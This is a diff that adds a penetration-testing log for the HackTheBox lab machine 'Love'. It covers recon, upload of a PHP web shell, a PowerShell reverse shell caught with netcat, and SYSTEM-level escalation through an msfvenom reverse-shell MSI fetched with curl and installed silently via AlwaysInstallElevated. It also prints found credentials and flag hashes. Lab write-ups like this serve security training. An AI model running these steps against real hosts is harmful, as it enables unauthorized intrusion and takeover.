@@ -1,0 +1,111 @@
+Machine-Name : Love
+IP-Address   : 10.129.48.103
+
+Command-Line: sudo nmap 10.129.48.103 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Command-Line(~/HackingTools/dirsearch): ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 50 -i 200-205,301,302,403 -u http://10.129.48.103 -o ~/HTB/Machines/Love_NF/recon/recon-1.txt
+Result:
+    ./recon/recon-1.txt
+
+Browser: http://10.129.48.103
+Notes: Title: "Voting System using PHP"
+
+Browser: https://10.129.48.103
+Notes: Accepted risk, viewed certificate, found "love.htb" and "staging.love.htb".
+Command-Line: sudo echo "10.129.48.103 love.htb staging.love.htb" >> /etc/hosts
+
+Browser: http://staging.love.htb
+Notes: Clicked "Demo", found "file scanning page" (/beta.php). Scanned localhost on port 5000. "http://127.0.0.1:5000"
+Result:
+    ./screenshots/beta-demo.png
+Notes: Found creds. admin : @LoveIsInTheAir!!!!
+
+Command-Line: crackmapexec smb 10.129.48.103 -u admin -p @LoveIsInTheAir!!!!
+Result:
+    crackmapexec smb 10.129.48.103 -u admin -p @LoveIsInTheAircccc
+    SMB         10.129.48.103   445    LOVE             [*] Windows 10 Pro 19042 x64 (name:LOVE) (domain:Love) (signing:False) (SMBv1:True)
+    SMB         10.129.48.103   445    LOVE             [-] Love\admin:@LoveIsInTheAircccc STATUS_LOGON_FAILURE
+
+Browser: http://10.129.48.103/admin
+Notes: Logged in with user "admin" and password "@LoveIsInTheAir!!!!".
+Command-Line: nano cmd.php
+Result:
+    ./www/cmd.php
+
+Notes: In the admin browser, I navigated to create a voter with an image. Uploaded "cmd.php" to ./www.
+Command-Line(./www): sudo python3 -m http.server --bind 10.10.14.99 80
+
+Browser: 10.129.48.103/images/cmd.php?cmd=whoami
+Result:
+    love/phoebe
+
+Notes: Sent request to BurpSuite Repeater.
+Result:
+    ./screenshots/burp-suite-1.png
+
+Command-Line(./www): rlwrap nc -lvnp 9001
+Command-Line(~/HackingTools/nishang/Shells): cp Invoke-PowerShellTcpOneLine.ps1 ~/HTB/Machines/Love_NF/www/shell.ps1
+Result:
+    ./www/shell.ps1
+Notes: Clicked "Send" in BurpSuite Repeater.
+Result:
+    PS C:\xampp\htdocs\omrs\images>
+    *** REVERSE SHELL ***
+    *** USER ACCESS ***
+
+PS C:\xampp\htdocs\omrs\images> whoami
+Result:
+    phoebe
+
+PS C:\xampp\htdocs\omrs\images> cd \Users\Phoebe\Desktop
+PS C:\Users\Phoebe\Desktop> type user.txt
+Result:
+    8b025ccb9af232975036c584d388173b
+    *** USER OWNED ***
+
+PS C:\Users\Phoebe\Desktop> cd \Users\Public\Documents
+Command-Line(~/HackingTools/PEASS-ng/winPEAS/winPEASexe/binaries/Obfuscated Releases): cp winPEAS.exe ~/HTB/Machines/Love_NF/www
+PS C:\Users\Public\Documents> curl 10.10.14.99:80/winPEAS.exe -o winPEAS.exe
+PS C:\Users\Public\Documents> dir
+Result:
+    Mode                 LastWriteTime         Length Name
+    -a----         9/23/2021   9:05 AM        1790464 winPEAS.exe
+
+PS C:\Users\Public\Documents> ./winPEAS.exe
+Result:
+    https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+
+Browser: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+Result:
+    ./screenshots/priv-esc.png
+
+Browser: AlwaysInstallElevated set to 1 in HKCU!
+URL: https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated/
+Notes: This module checks the AlwaysInstallElevated registry keys which dictates if .MSI files should be installed with elevated privileges (NT AUTHORITY\SYSTEM). The generated .MSI file has an embedded executable which is extracted and run by the installer. After execution the .MSI file intentionally fails installation (by calling some invalid VBS) to prevent it being registered on the system. By running this with the /quiet argument the error will not be seen by the user.
+
+Command-Line(./www): msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.99 LPORT=9001 -f msi > payload.msi
+Command-Line: rlwrap nc -lvnp 9001
+
+PS C:\Users\Public\Documents> curl 10.10.14.99:80/payload.msi -o payload.msi
+Result:
+    Mode                 LastWriteTime         Length Name
+        ----                 -------------         ------ ----
+        -a----         9/23/2021   9:22 AM         159744 payload.msi
+        -a----         9/23/2021   9:05 AM        1790464 winPEAS.exe
+
+PS C:\Users\Public\Documents> msiexec /q /i payload.msi
+Result:
+    *** REVERSE SHELL ***
+    *** ROOT ACCESS ***
+    nt authority\system
+
+nt authority\system> type \Users\Administrator\Desktop\root.txt
+Result:
+    27382add2dae57d757174000baa667b3
+    *** ROOT OWNED ***
+
+      *** FINISHED ***
